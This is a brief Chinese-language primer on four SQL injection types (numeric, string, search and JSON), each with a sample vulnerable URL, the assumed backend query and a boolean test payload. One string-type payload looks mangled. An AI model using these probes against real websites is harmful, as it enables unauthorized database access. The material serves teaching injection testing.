一、数字型注入

1、存在注入的url

www.baidu.con/aiyou.php?id=1

2、数据库查询的语句

select * from aiyou where id=1

3、测试语句

1 and 1=2

二、字符型注入

1、存在注入的url

www.baidu.con/aiyou.php?id=1

2、数据库查询的语句

select * from aiyou where id='1'

3、测试语句

1' and '1'='11' and 1=1 --

三、搜索型注入

1、存在注入的url

www.baidu.con/aiyou.php?id=1

2、数据库查询的语句

select * from aiyou where id like '%1%'

3、测试语句

1%' and 1=1 and '%'='

四、json型注入

1、存在注入的url

www.baidu.con/aiyou.php?id=1

2、数据库查询的语句

{    "id":"1"}

3、测试语句

{    "id":"1 and 1=1"}
